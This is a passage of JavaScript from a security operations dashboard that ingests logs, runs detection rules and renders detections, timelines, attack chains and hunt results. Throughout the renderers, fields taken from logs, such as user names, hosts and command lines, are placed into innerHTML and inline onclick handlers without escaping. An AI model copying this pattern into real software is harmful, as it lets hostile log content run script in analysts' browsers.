    const fmt = document.getElementById('rk-paste-fmt')?.value || 'json';
    const res = document.getElementById('rk-ingest-result');
    if (res) res.innerHTML = `<div style="padding:20px;text-align:center;">${_spinner('Analyzing events…')}</div>`;
    try {
      // Multi-format parser — supports JSON array/object, Syslog RFC3164/RFC5424, CEF
      const events = _parseLogInput(raw, fmt);
      if (!events.length) return _showToast('No parseable events found. Check format selection.', 'warning');

      let r;
      try {
        // Try backend first
        const backendRaw = await _api('POST', '/ingest', { events, context: { format: fmt } });
        // Smart processing: cross-validate with CSDE to eliminate noise
        r = CSDE.processBackendResult(backendRaw, events);
        console.log(`[RAYKAN] Smart analysis: ${(backendRaw._meta?.rawDetections || normalizeDetections(backendRaw.detections).length)} backend raw → ${r.detections.length} final detections`);
      } catch(apiErr) {
        // Fallback: run full client-side detection engine (CSDE)
        console.warn('[RAYKAN] Backend unavailable — using client-side detection engine:', apiErr.message);
        r = CSDE.analyzeEvents(events, { dedupWindowMs: 300_000 });
        _showToast(`[Offline Mode] Analyzed ${events.length} events — ${r.detections.length} detections found`, 'info');
      }

      // Guaranteed iterable array regardless of response shape
      const dets  = normalizeDetections(r.detections);
      const tl    = normalizeDetections(r.timeline);
      const chs   = normalizeDetections(r.chains);
      const anoms = normalizeDetections(r.anomalies);
      const incs  = Array.isArray(r.incidents) ? r.incidents : [];

      // Use CSDE.mergeDetections to cross-analysis deduplicate
      S.detections  = CSDE.mergeDetections(S.detections, dets);
      S.incidents   = [...incs, ...(S.incidents || [])];
      S.timeline    = [...tl, ...S.timeline];
      S.chains      = [...chs,   ...S.chains];
      S.anomalies   = [...anoms, ...S.anomalies];
      S.riskScore   = Math.max(r.riskScore || 0, S.riskScore);
      S.sessionId   = r.sessionId || S.sessionId;
      S.lastUpdated = new Date();
      _updateStats(r);
      if (dets.length) {
        _showToast(`✓ ${events.length} events → ${S.detections.length} detection(s) [deduped], ${chs.length} chain(s) | Risk: ${r.riskScore}`, 'success');
      }
      if (res) res.innerHTML = _ingestSummaryCard(r);
      // Auto-navigate: prefer incidents tab when incidents were formed, else detections
      if (dets.length) setTimeout(() => _setTab(incs.length ? 'incidents' : 'detections'), 800);
    } catch(e) {
      if (res) res.innerHTML = `<div style="color:#ef4444;padding:20px;border-radius:8px;background:rgba(239,68,68,0.08);">
        <div style="font-weight:700;margin-bottom:6px;">⚠ Analysis Error</div>
        <div style="font-size:12px;">${e.message}</div>
      </div>`;
      _showToast('Ingest failed: ' + e.message, 'error');
    }
  }

  function _ingestSummaryCard(r) {
    // normalizeDetections before .length access — response shape may vary
    const detsLen   = normalizeDetections(r.detections).length;
    const anomsLen  = normalizeDetections(r.anomalies).length;
    const chsLen    = normalizeDetections(r.chains).length;
    const incsLen   = Array.isArray(r.incidents) ? r.incidents.length : 0;
    const isOffline = r.engine === 'CSDE-offline';
    const isHybrid  = r.engine === 'CSDE+Backend';
    const rawDets   = r._meta?.rawDetections || r._meta?.backendRaw || detsLen;
    const deduped   = r._meta?.dedupedDetections || detsLen;
    const csdeCount = r._meta?.csdeDetections || 0;
    const backendExtra = r._meta?.backendExtraAdded || 0;
    const osMismatch = r._meta?.osMismatchFiltered || 0;
    const schemaSkipped = r._meta?.schemaSkipped || 0;
    const incidentsFrmd = r._meta?.incidentsFormed || incsLen;
    const dedupSaving = rawDets > deduped ? rawDets - deduped : 0;
    const eventsOs   = r._meta?.eventsOs || '';
    const correlWin  = ((r._meta?.correlWindowMs || 60000) / 1000);

    // Build engine badge
    const engineBadge = isOffline
      ? `<span style="font-size:10px;padding:2px 8px;border-radius:10px;background:rgba(96,165,250,0.12);color:#60a5fa;font-weight:700;">OFFLINE — CSDE v4</span>`
      : isHybrid
      ? `<span style="font-size:10px;padding:2px 8px;border-radius:10px;background:rgba(52,211,153,0.12);color:#34d399;font-weight:700;">SMART ANALYSIS — CSDE v4 + Backend</span>`
      : `<span style="font-size:10px;padding:2px 8px;border-radius:10px;background:rgba(167,139,250,0.12);color:#a78bfa;font-weight:700;">Backend Engine</span>`;

    // Smart analysis breakdown (only shown for hybrid mode)
    const smartBreakdown = isHybrid && rawDets > deduped ? `
<div style="margin-top:10px;padding:10px 14px;background:rgba(52,211,153,0.04);border:1px solid rgba(52,211,153,0.15);border-radius:8px;font-size:11px;">
  <div style="color:#34d399;font-weight:700;margin-bottom:6px;">🔬 Smart Analysis Breakdown</div>
  <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;color:#9ca3af;">
    <span>Backend raw rule matches:</span><span style="color:#f97316;font-weight:600;">${rawDets} detections</span>
    <span>OS mismatch filtered:</span><span style="color:#6b7280;font-weight:600;">−${osMismatch} (${eventsOs} host, Linux rules removed)</span>
    ${schemaSkipped ? `<span>Schema gate skipped:</span><span style="color:#6b7280;font-weight:600;">−${schemaSkipped} (wrong log category)</span>` : ''}
    <span>CSDE precise detections:</span><span style="color:#34d399;font-weight:600;">${csdeCount}</span>
    <span>Backend unique additions:</span><span style="color:#60a5fa;font-weight:600;">+${backendExtra}</span>
    <span style="color:#e6edf3;font-weight:700;">Final verified detections:</span><span style="color:#ef4444;font-weight:700;">${deduped}</span>
  </div>
  <div style="margin-top:6px;padding-top:6px;border-top:1px solid rgba(255,255,255,0.06);color:#6b7280;">
    Noise reduction: ${rawDets} → ${deduped} (${Math.round((1-deduped/Math.max(rawDets,1))*100)}% false positives eliminated)
  </div>
</div>` : (dedupSaving > 0 ? `
<div style="margin-top:10px;padding:8px 12px;background:rgba(52,211,153,0.06);border:1px solid rgba(52,211,153,0.15);border-radius:6px;font-size:11px;color:#34d399;">
  Deduplication: ${rawDets} raw → ${deduped} unique detection(s) | Window: ${((r._meta?.dedupWindowMs||60000)/1000)}s
  ${schemaSkipped ? ` | Schema gate blocked ${schemaSkipped} cross-category rule evaluations` : ''}
</div>` : '');

    // Correlation summary
    const correlSummary = incidentsFrmd > 0 ? `
<div style="margin-top:8px;padding:8px 12px;background:rgba(239,68,68,0.04);border:1px solid rgba(239,68,68,0.15);border-radius:6px;font-size:11px;color:#ef4444;">
  🎯 <strong>${incidentsFrmd} incident${incidentsFrmd>1?'s':''}</strong> formed by correlating alerts within ${correlWin}s temporal window (same host + user)
</div>` : '';

    return `<div class="rk-card" style="padding:16px;">
  <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;flex-wrap:wrap;">
    <div style="font-size:13px;font-weight:600;color:#34d399;">✓ Analysis Complete</div>
    ${engineBadge}
    ${dedupSaving > 0 ? `<span style="font-size:10px;padding:2px 8px;border-radius:10px;background:rgba(52,211,153,0.12);color:#34d399;font-weight:700;">🧹 ${dedupSaving} noise eliminated</span>` : ''}
  </div>
  <div class="rk-grid-3" style="gap:8px;">
    ${_miniStat('Events',             r._meta?.eventsAnalyzed || r.processed || 0, '#60a5fa')}
    ${_miniStat('Raw Rule Matches',   rawDets,             '#f97316')}
    ${_miniStat('Verified Detections',deduped,             '#ef4444')}
    ${_miniStat('Incidents',          incidentsFrmd,       '#ef4444')}
    ${_miniStat('Attack Chains',      chsLen,              '#a78bfa')}
    ${_miniStat('Risk Score',         r.riskScore||0, r.riskScore >= 80 ? '#ef4444' : r.riskScore >= 50 ? '#f97316' : '#34d399')}
  </div>
  ${smartBreakdown}
  ${correlSummary}
  <div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap;">
    <button class="rk-btn rk-btn-primary" onclick="RAYKAN_UI._setTab('incidents')"  style="font-size:11px;">🎯 Incidents →</button>
    <button class="rk-btn rk-btn-ghost"   onclick="RAYKAN_UI._setTab('detections')" style="font-size:11px;">All Detections →</button>
    <button class="rk-btn rk-btn-ghost"   onclick="RAYKAN_UI._setTab('chains')"     style="font-size:11px;">Attack Chains →</button>
    <button class="rk-btn rk-btn-ghost"   onclick="RAYKAN_UI._setTab('timeline')"   style="font-size:11px;">Timeline →</button>
  </div>
</div>`;
  }

  function _miniStat(label, val, color) {
    return `<div style="padding:10px;background:#0d1117;border-radius:6px;text-align:center;">
  <div style="font-size:18px;font-weight:700;color:${color};">${val}</div>
  <div style="font-size:10px;color:#6b7280;margin-top:2px;">${label}</div>
</div>`;
  }

  // ════════════════════════════════════════════════════════════════
  //  FILE UPLOAD
  // ════════════════════════════════════════════════════════════════
  function _initUploadZone() {
    const zone = document.getElementById('rk-drop-zone');
    if (!zone) return;
    zone.addEventListener('dragover',  e => { e.preventDefault(); zone.classList.add('drag-over'); });
    zone.addEventListener('dragleave', () => zone.classList.remove('drag-over'));
    zone.addEventListener('drop',      e => { e.preventDefault(); zone.classList.remove('drag-over'); _handleFileUpload(e.dataTransfer.files[0]); });
  }

  async function _handleFileUpload(file) {
    if (!file) return;
    const prog = document.getElementById('rk-upload-progress');
    const bar  = document.getElementById('rk-upload-bar');
    const msg  = document.getElementById('rk-upload-msg');
    if (prog) prog.style.display = 'block';
    if (msg)  msg.textContent = `Reading ${file.name}…`;
    if (bar)  bar.style.width = '20%';

    try {
      const text = await file.text();
      if (bar) bar.style.width = '40%';
      if (msg) msg.textContent = 'Parsing events…';

      let events;
      const ext = file.name.split('.').pop().toLowerCase();
      if (ext === 'json' || ext === 'txt') {
        // Try JSON parse first (handles .json.txt files too)
        try {
          events = JSON.parse(text);
          if (!Array.isArray(events)) events = [events];
        } catch {
          // Try JSON Lines (newline-delimited)
          const lines = text.split('\n').filter(Boolean);
          const jsonLines = lines.filter(l => l.trim().startsWith('{') || l.trim().startsWith('['));
          if (jsonLines.length) {
            events = jsonLines.map(l => { try { return JSON.parse(l); } catch { return { raw: l }; } });
          } else {
            // Syslog / CEF / plain text lines
            events = lines.map(l => _parseSyslogLine(l));
          }
        }
      } else if (ext === 'log' || ext === 'syslog') {
        events = text.split('\n').filter(Boolean).map(l => _parseSyslogLine(l));
      } else if (ext === 'csv') {
        // Parse CSV headers
        const lines = text.split('\n').filter(Boolean);
        const headers = lines[0].split(',').map(h => h.trim().replace(/^"|"$/g, ''));
        events = lines.slice(1).map(line => {
          const vals = line.split(',');
          const ev = {};
          headers.forEach((h, i) => { ev[h] = (vals[i] || '').replace(/^"|"$/g, '').trim(); });
          return ev;
        });
      } else {
        events = text.split('\n').filter(Boolean).map(l => ({ raw: l, source: 'file' }));
      }

      if (!events || !events.length) {
        if (msg) msg.textContent = '✗ No parseable events found in file';
        _showToast('No events found in file', 'warning');
        return;
      }

      if (bar) bar.style.width = '60%';
      if (msg) msg.textContent = `Analyzing ${events.length} event(s)…`;

      const eventsSlice = events.slice(0, 5000);
      let r;
      try {
        // Try backend API first
        const backendRaw = await _api('POST', '/ingest', { events: eventsSlice, context: { source: 'file', fileName: file.name } });
        // Smart processing: run CSDE in parallel for cross-validation & OS filtering
        // This eliminates the 369-detection spam from Hayabusa/Sigma rule noise
        r = CSDE.processBackendResult(backendRaw, eventsSlice);
        console.log(`[RAYKAN] Smart analysis: ${(backendRaw._meta?.rawDetections || normalizeDetections(backendRaw.detections).length)} backend raw → ${r.detections.length} final detections`);
      } catch(apiErr) {
        // Fallback: client-side detection engine (CSDE)
        console.warn('[RAYKAN] Backend unavailable — using CSDE for file:', apiErr.message);
        r = CSDE.analyzeEvents(eventsSlice, { dedupWindowMs: 300_000 });
      }

      if (bar) bar.style.width = '100%';

      const dets  = normalizeDetections(r.detections);
      const tl    = normalizeDetections(r.timeline);
      const chs   = normalizeDetections(r.chains);
      const anoms = normalizeDetections(r.anomalies);
      const incs  = Array.isArray(r.incidents) ? r.incidents : [];

      // Cross-analysis dedup merge (handles repeated uploads)
      S.detections  = CSDE.mergeDetections(S.detections, dets);
      S.incidents   = [...incs, ...(S.incidents || [])];
      if (msg) msg.textContent = `✓ Done — ${S.detections.length} detection(s) [deduped]${r.engine === 'CSDE-offline' ? ' [Offline]' : ''}`;

      S.timeline    = [...tl,    ...S.timeline];
      S.chains      = [...chs,   ...S.chains];
      S.anomalies   = [...anoms, ...S.anomalies];
      S.riskScore   = Math.max(r.riskScore || 0, S.riskScore);
      S.sessionId   = r.sessionId || S.sessionId;
      S.lastUpdated = new Date();
      _updateStats(r);

      const res = document.getElementById('rk-ingest-result');
      if (res) res.innerHTML = _ingestSummaryCard(r);
      _showToast(`${file.name}: ${S.detections.length} detection(s)${r.engine === 'CSDE-offline' ? ' (offline engine)' : ''}`, dets.length ? 'success' : 'info');
      // Auto-navigate: prefer incidents tab when incidents were formed, else detections
      if (dets.length) setTimeout(() => _setTab(incs.length ? 'incidents' : 'detections'), 800);
    } catch(e) {
      if (msg) msg.textContent = '✗ Error: ' + e.message;
      _showToast('Upload failed: ' + e.message, 'error');
    }
  }


  // ════════════════════════════════════════════════════════════════
  //  RENDERERS
  // ════════════════════════════════════════════════════════════════

  // ── Detections list ──────────────────────────────────────────
  function _renderDetectionsList(dets) {
    const el = document.getElementById('rk-det-list');
    if (!el) return;
    if (!dets.length) {
      el.innerHTML = `<div style="padding:60px;text-align:center;color:#4b5563;font-size:13px;">No detections yet — run a demo or ingest logs.</div>`;
      return;
    }
    // Count aggregated vs raw
    const aggCount = dets.filter(d => d.variants_triggered && d.variants_triggered.length > 0).length;
    const banner = aggCount > 0 ? `
<div style="padding:8px 14px;background:rgba(96,165,250,0.08);border:1px solid rgba(96,165,250,0.2);border-radius:8px;margin-bottom:10px;display:flex;align-items:center;gap:10px;">
  <span style="font-size:13px;">🧹</span>
  <span style="font-size:12px;color:#60a5fa;">Deduplicated view — <strong>${dets.length}</strong> unique detection(s) from ${dets.reduce((s,d)=>s+(d.event_count||1),0)} total events. Click any row to expand variants &amp; evidence.</span>
</div>` : '';
    el.innerHTML = banner + `
<table class="rk-table">
  <thead><tr>
    <th>Severity</th><th>Detection Name</th><th>Host</th><th>User</th>
    <th>MITRE</th><th>Events</th><th>Confidence</th><th>Risk</th><th>First Seen</th><th></th>
  </tr></thead>
  <tbody>${dets.map(d => {
    const sev    = d.aggregated_severity || d.severity || 'medium';
    const eCount = d.event_count || (d.evidence ? d.evidence.length : 1);
    const vCount = d.variants_triggered ? d.variants_triggered.length : 1;
    const conf   = d.confidence_score || 30;
    const confColor = conf >= 80 ? '#ef4444' : conf >= 60 ? '#f97316' : conf >= 40 ? '#eab308' : '#6b7280';
    // Extract MITRE technique from nested or flat field
    const mitreTech = (d.mitre && d.mitre.technique) ? d.mitre.technique
                    : (d.technique || d.technique_id || d.mitre_technique || '');
    const mitreName = (d.mitre && d.mitre.name) ? d.mitre.name : '';
    const mitreTactic = (d.mitre && d.mitre.tactic) ? d.mitre.tactic.replace(/-/g,' ') : '';
    const mitreDisplay = mitreTech
      ? `<a href="https://attack.mitre.org/techniques/${mitreTech.replace('.','/')}/" target="_blank"
             title="${mitreName}${mitreTactic ? ' — '+mitreTactic : ''}"
             style="color:#a78bfa;text-decoration:none;font-size:10px;"
             onclick="event.stopPropagation();">${mitreTech}</a>`
      : '<span style="color:#374151;font-size:10px;">—</span>';
    const varBadge = vCount > 1
      ? `<span style="font-size:9px;padding:1px 5px;background:rgba(167,139,250,0.15);color:#a78bfa;border-radius:8px;margin-left:4px;">${vCount} variants</span>`
      : '';
    // Category badge
    const cat = d.category || '';
    const catColor = cat.includes('credential') ? '#ef4444' : cat.includes('execut') ? '#f97316'
                   : cat.includes('persist') ? '#eab308' : cat.includes('lateral') ? '#a78bfa'
                   : cat.includes('discovery') ? '#60a5fa' : '#6b7280';
    return `
  <tr onclick="RAYKAN_UI._showDetDetail('${d.id||''}')" style="cursor:pointer;">
    <td>${_sevBadge(sev)}</td>
    <td style="font-weight:600;color:#e6edf3;max-width:220px;">
      <div style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="${(d.detection_name||d.ruleName||d.title||'Detection').replace(/"/g,'&quot;')}">${d.detection_name||d.ruleName||d.title||'Detection'}${varBadge}</div>
      ${cat ? `<div style="font-size:9px;color:${catColor};margin-top:2px;text-transform:uppercase;letter-spacing:0.5px;">${cat}</div>` : ''}
    </td>
    <td style="color:#8b949e;font-family:monospace;font-size:11px;">${d.computer||d.host||'—'}</td>
    <td style="color:#60a5fa;font-size:11px;">${d.user||'—'}</td>
    <td>${mitreDisplay}</td>
    <td style="text-align:center;color:#e6edf3;font-weight:600;font-size:12px;">${eCount}</td>
    <td style="text-align:center;">
      <span style="font-size:11px;font-weight:700;color:${confColor};">${conf}%</span>
    </td>
    <td><span style="font-weight:700;color:${_riskColor(d.riskScore||0)};">${d.riskScore||'—'}</span></td>
    <td style="color:#6b7280;font-size:11px;white-space:nowrap;">${_fmtTime(d.first_seen||d.timestamp)}</td>
    <td>
      <button class="rk-entity-btn" onclick="event.stopPropagation();RAYKAN_UI._invEntity('${d.computer||d.host||''}')">
        Investigate →
      </button>
    </td>
  </tr>`;
  }).join('')}
  </tbody>
</table>`;
  }

  // ── Timeline ─────────────────────────────────────────────────
  function _renderTimelineList(tl) {
    const el = document.getElementById('rk-tl-container');
    if (!el) return;
    if (!tl.length) {
      el.innerHTML = `<div style="padding:60px;text-align:center;color:#4b5563;font-size:13px;">Timeline empty — run analysis.</div>`;
      return;
    }
    const sorted = [...tl].sort((a,b) => new Date(a.timestamp||a.ts||0) - new Date(b.timestamp||b.ts||0));
    // Find detections that correspond to timeline entries
    const detMap = new Map(S.detections.map(d => [d.id, d]));
    el.innerHTML = sorted.map((e, idx) => {
      const type   = e.type || 'event';
      const col = type === 'detection' ? '#ef4444'
               : type === 'authentication' ? '#f97316'
               : type === 'process'        ? '#60a5fa'
               : type === 'persistence'    ? '#eab308'
               : type === 'network'        ? '#34d399'
               : type === 'file'           ? '#a78bfa'
               : '#8b949e';
      const det = e.detection ? (detMap.get(e.detection) || S.detections.find(d => d.id === e.detection)) : null;
      const detBadge = det
        ? `<span style="font-size:10px;padding:2px 7px;background:rgba(239,68,68,0.12);color:#ef4444;border-radius:8px;font-weight:700;cursor:pointer;"
             onclick="event.stopPropagation();RAYKAN_UI._showDetDetail('${det.id||''}')">
             🚨 ${_truncate(det.detection_name||det.ruleName||det.title||'Detection',40)}</span>`
        : '';
      // Expandable raw events for aggregated timeline entries
      const uid = `rk-tl-${idx}`;
      return `
<div class="rk-timeline-item" style="border-left-color:${col};">
  <div class="rk-tl-dot" style="background:${col};"></div>
  <div style="flex:1;min-width:0;">
    <div style="display:flex;align-items:center;gap:8px;margin-bottom:3px;flex-wrap:wrap;">
      <span class="rk-tag" style="color:${col};background:${col}1a;">${type}</span>
      <span style="font-size:11px;color:#4b5563;">${_fmt(e.timestamp||e.ts)}</span>
      <span style="font-size:11px;color:#6b7280;">${e.entity||e.computer||''}</span>
      ${e.user&&e.user!==e.entity?`<span style="font-size:11px;color:#60a5fa;">${e.user}</span>`:''}
      ${detBadge}
    </div>
    <div style="font-size:13px;color:#e6edf3;">${e.description||e.summary||'Event'}</div>
    ${e.commandLine ? `<div class="rk-code" style="font-size:11px;color:#8b949e;margin-top:4px;white-space:pre-wrap;word-break:break-all;">${_truncate(e.commandLine, 160)}</div>` : ''}
  </div>
</div>`;
    }).join('');
  }

  // ── Chains ───────────────────────────────────────────────────
  function _renderChainsList(chains) {
    const el = document.getElementById('rk-chains-list');
    if (!el) return;
    if (!chains.length) {
      el.innerHTML = `<div style="padding:60px;text-align:center;color:#4b5563;font-size:13px;">No attack chains detected yet.</div>`;
      return;
    }
    el.innerHTML = chains.map((c, i) => _renderChainCard(c, i)).join('');
  }

  function _renderChainCard(c, i) {
    const stages    = c.stages || c.steps || c.detections || [];
    const techniques= c.techniques || stages.map(s => s.technique || s.mitre?.technique).filter(Boolean);
    const riskColor = c.riskScore >= 80 ? '#ef4444' : c.riskScore >= 60 ? '#f97316' : c.riskScore >= 40 ? '#eab308' : '#60a5fa';
    const animDelay = (i * 0.06).toFixed(2);
    return `
<div class="rk-card" style="padding:0;overflow:hidden;animation:rk3-fade-up 0.35s ease-out ${animDelay}s both;">
  <!-- Animated top border for chain severity -->
  <div style="height:3px;background:linear-gradient(90deg,${riskColor}44,${riskColor},${riskColor}44);
    background-size:200% 100%;animation:rk3-border-flow 2.5s linear infinite;"></div>
  <div class="rk-card-hdr" style="background:rgba(${c.riskScore>=80?'239,68,68':c.riskScore>=60?'249,115,22':'0,212,255'},0.04);">
    <div style="display:flex;align-items:center;gap:12px;">
      <!-- Animated chain icon -->
      <div style="width:38px;height:38px;border-radius:10px;background:rgba(${c.riskScore>=80?'239,68,68':'167,139,250'},0.12);
        border:1px solid rgba(${c.riskScore>=80?'239,68,68':'167,139,250'},0.25);
        display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;
        box-shadow:0 0 16px rgba(${c.riskScore>=80?'239,68,68':'167,139,250'},0.15);">🔗</div>
      <div>
        <div style="font-size:13px;font-weight:700;color:#e2e8f0;">
          Attack Chain #${i+1}
          <span style="font-weight:400;color:#6b7280;margin-left:4px;">— ${c.name || c.type || 'Multi-stage Attack'}</span>
        </div>
        <div style="font-size:11px;color:#4b6b8a;margin-top:3px;font-family:'JetBrains Mono',monospace;">
          <span style="color:#3d6080;">${stages.length} stages</span>
          ${c.entities?.length ? ` · <span style="color:#2d4a5a;">${c.entities.slice(0,3).join(', ')}</span>` : ''}
        </div>
      </div>
    </div>
    <div style="display:flex;align-items:center;gap:8px;flex-shrink:0;">
      <div style="padding:4px 12px;border-radius:16px;font-size:11px;font-weight:700;
        font-family:'JetBrains Mono',monospace;
        background:rgba(${c.riskScore>=80?'239,68,68':c.riskScore>=60?'249,115,22':'107,114,128'},0.12);
        color:${riskColor};border:1px solid ${riskColor}44;">
        RISK ${c.riskScore||'—'}
      </div>
      ${_sevBadge(c.severity||'high')}
    </div>
  </div>
  <div style="padding:18px;">
    <!-- Chain node flow strip -->
    <div style="display:flex;align-items:center;gap:0;flex-wrap:wrap;margin-bottom:16px;
      padding:12px 14px;background:rgba(0,0,0,0.3);border-radius:10px;
      border:1px solid rgba(0,212,255,0.07);">
      ${stages.map((s, si) => {
        const tactic   = (s.tactic||'').toLowerCase().replace(/\s+/g,'-');
        const nodeCol  = TACTIC_NODE_COLOR[tactic] || '#3d6080';
        return `
        <div style="display:flex;align-items:center;gap:0;">
          <div style="padding:6px 12px;border-radius:6px;font-size:10.5px;font-weight:600;
            background:${nodeCol}18;border:1px solid ${nodeCol}55;color:#c9d1d9;
            white-space:nowrap;font-family:'JetBrains Mono',monospace;
            transition:all 0.2s;cursor:default;"
            onmouseenter="this.style.background='${nodeCol}30';this.style.borderColor='${nodeCol}';this.style.boxShadow='0 0 12px ${nodeCol}33';"
            onmouseleave="this.style.background='${nodeCol}18';this.style.borderColor='${nodeCol}55';this.style.boxShadow='none';">
            <span style="color:${nodeCol};font-weight:700;margin-right:5px;">${si+1}</span>${s.ruleName||s.title||s.technique||'Step'}
          </div>
          ${si < stages.length-1 ? `
          <svg width="28" height="12" viewBox="0 0 28 12" style="flex-shrink:0;">
            <defs>
              <marker id="ah-${i}-${si}" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
                <path d="M0,0 L0,6 L6,3 z" fill="${nodeCol}88"/>
              </marker>
            </defs>
            <line x1="2" y1="6" x2="22" y2="6" stroke="${nodeCol}55" stroke-width="1.5"
              stroke-dasharray="4,3" marker-end="url(#ah-${i}-${si})"/>
          </svg>` : ''}
        </div>`;
      }).join('')}
    </div>
    <!-- MITRE techniques -->
    ${techniques.length ? `
    <div style="display:flex;gap:5px;flex-wrap:wrap;margin-bottom:12px;">
      ${techniques.slice(0,10).map(t => `
        <span style="padding:2px 8px;border-radius:5px;font-size:10px;font-weight:600;
          background:rgba(167,139,250,0.10);color:#a78bfa;border:1px solid rgba(167,139,250,0.2);
          font-family:'JetBrains Mono',monospace;">${t}</span>`).join('')}
      ${techniques.length > 10 ? `<span style="color:#4b6b8a;font-size:10px;align-self:center;">+${techniques.length-10} more</span>` : ''}
    </div>` : ''}
    <!-- Entities -->
    ${c.entities?.length ? `
    <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
      <span style="font-size:10px;color:#3d5a6b;font-weight:700;text-transform:uppercase;letter-spacing:1px;">Entities</span>
      ${c.entities.map(e => `
        <button class="rk-entity-btn" onclick="RAYKAN_UI._invEntity('${e}')"
          style="font-size:10px;padding:3px 10px;">${e}</button>`).join('')}
    </div>` : ''}
  </div>
</div>`;
  }

  function _chainPreview(c) {
    const stages = c.stages || c.steps || c.detections || [];
    const riskColor = c.riskScore >= 80 ? '#ef4444' : c.riskScore >= 60 ? '#f97316' : '#a78bfa';
    return `
<div class="rk-chain-preview" style="margin-bottom:8px;">
  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;">
    <div style="font-size:11px;font-weight:700;color:#a78bfa;font-family:'JetBrains Mono',monospace;letter-spacing:0.5px;">
      ⛓ ${c.name || c.type || 'Attack Chain'} · <span style="color:#4b6b8a;">${stages.length} stages</span>
    </div>
    ${c.riskScore ? `<div style="font-size:10px;font-weight:700;color:${riskColor};font-family:'JetBrains Mono',monospace;
      padding:2px 8px;background:${riskColor}18;border:1px solid ${riskColor}38;border-radius:8px;">RISK ${c.riskScore}</div>` : ''}
  </div>
  <div style="display:flex;align-items:center;gap:3px;flex-wrap:wrap;">
    ${stages.slice(0, 5).map((s, i) => {
      const tactic = (s.tactic||'').toLowerCase().replace(/\s+/g,'-');
      const nc = TACTIC_NODE_COLOR[tactic] || '#2d4a5a';
      return `
      <span style="display:inline-flex;align-items:center;padding:4px 10px;border-radius:5px;
        font-size:10px;font-weight:600;font-family:'JetBrains Mono',monospace;
        background:${nc}18;border:1px solid ${nc}44;color:#c9d1d9;white-space:nowrap;">
        <span style="color:${nc};font-weight:800;margin-right:4px;">${i+1}</span>${s.ruleName||s.title||'Stage'}
      </span>
      ${i < Math.min(stages.length-1, 4) ? `<span style="color:rgba(0,212,255,0.25);font-size:12px;padding:0 1px;">›</span>` : ''}`;
    }).join('')}
    ${stages.length > 5 ? `<span style="color:#4b6b8a;font-size:10px;padding:4px 8px;
      border:1px solid rgba(0,212,255,0.10);border-radius:5px;font-family:'JetBrains Mono',monospace;">
      +${stages.length-5} more</span>` : ''}
  </div>
</div>`;
  }

  // ── Anomalies ────────────────────────────────────────────────
  function _renderAnomaliesList(anoms) {
    const el = document.getElementById('rk-anom-list');
    if (!el) return;
    if (!anoms.length) {
      el.innerHTML = `<div style="padding:60px;text-align:center;color:#4b5563;font-size:13px;">No behavioral anomalies detected.</div>`;
      return;
    }
    el.innerHTML = anoms.map(a => `
<div class="rk-card" style="padding:16px;display:flex;gap:16px;align-items:flex-start;">
  <div style="width:48px;height:48px;border-radius:50%;background:rgba(245,158,11,.15);
    display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:20px;">📈</div>
  <div style="flex:1;min-width:0;">
    <div style="font-size:13px;font-weight:600;color:#e6edf3;margin-bottom:4px;">
      ${a.description || a.type || 'Behavioral Anomaly'}
    </div>
    <div style="font-size:11px;color:#6b7280;margin-bottom:8px;">
      Entity: <span style="color:#f59e0b;">${a.entity||'—'}</span> ·
      Score: <span style="color:#ef4444;font-weight:700;">${a.score?.toFixed(2)||'—'}</span> ·
      ${_fmtTime(a.timestamp)}
    </div>
    ${a.baseline !== undefined ? `<div style="font-size:11px;color:#4b5563;">
      Baseline: ${a.baseline} → Observed: <span style="color:#f59e0b;">${a.observed||'—'}</span>
      (${a.deviation ? '+'+a.deviation+'%' : ''})
    </div>` : ''}
  </div>
  <span class="rk-badge" style="background:rgba(245,158,11,.12);color:#f59e0b;flex-shrink:0;">ANOMALY</span>
</div>`).join('');
  }

  // ── Hunt results ─────────────────────────────────────────────
  function _renderHuntResults(r) {
    const el = document.getElementById('rk-h-results');
    if (!el) return;

    if (!r.count) {
      el.innerHTML = `<div class="rk-card" style="padding:40px;text-align:center;color:#4b5563;font-size:13px;">
        No matches. ${r.suggestion ? `<br/><span style="color:#60a5fa;margin-top:8px;display:inline-block;">💡 ${r.suggestion}</span>` : ''}
      </div>`;
      return;
    }

    const rows = (r.matches || []).slice(0, 100).map(m => `
<tr>
  <td class="rk-code" style="color:#6b7280;">${_fmtTime(m.timestamp)}</td>
  <td style="color:#e6edf3;">${m.computer||m.host||'—'}</td>
  <td style="color:#60a5fa;">${m.user||'—'}</td>
  <td style="color:#34d399;">${m.process||m.processName||'—'}</td>
  <td class="rk-code" style="color:#8b949e;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">
    ${m.commandLine||m.srcIp||'—'}
  </td>
</tr>`).join('');

    el.innerHTML = `
<div class="rk-card" style="overflow:hidden;">
  <div class="rk-card-hdr">
    <span style="font-size:13px;font-weight:600;">Results — ${r.count} matches</span>
    <div style="display:flex;gap:8px;align-items:center;">
      ${r.explanation ? `<span style="font-size:11px;color:#60a5fa;">AI: ${_truncate(r.explanation, 60)}</span>` : ''}
      <span style="font-size:11px;color:#6b7280;">${r.duration}ms</span>
      <button class="rk-btn rk-btn-ghost" style="font-size:11px;" onclick="RAYKAN_UI._exportHuntCSV()">↓ CSV</button>
    </div>
  </div>
  ${r.rqlQuery ? `<div style="padding:8px 16px;background:#0d1117;border-bottom:1px solid #21262d;">
    <span style="font-size:10px;color:#6b7280;">RQL: </span>
    <code class="rk-code" style="font-size:11px;color:#60a5fa;">${r.rqlQuery}</code>
  </div>` : ''}
  <div style="overflow-x:auto;">
    <table class="rk-table">
      <thead><tr><th>Time</th><th>Host</th><th>User</th><th>Process</th><th>Command / Detail</th></tr></thead>
      <tbody>${rows}</tbody>
    </table>
  </div>
  ${r.count > 100 ? `<div style="padding:10px 16px;color:#6b7280;font-size:11px;text-align:right;">
    Showing 100 of ${r.count} results
  </div>` : ''}
</div>`;
  }

  // ── IOC results ──────────────────────────────────────────────
  function _renderIOCResult(ioc, container) {
    if (!container) return;
    if (!ioc) { container.innerHTML = `<div style="color:#6b7280;padding:20px;">No results.</div>`; return; }

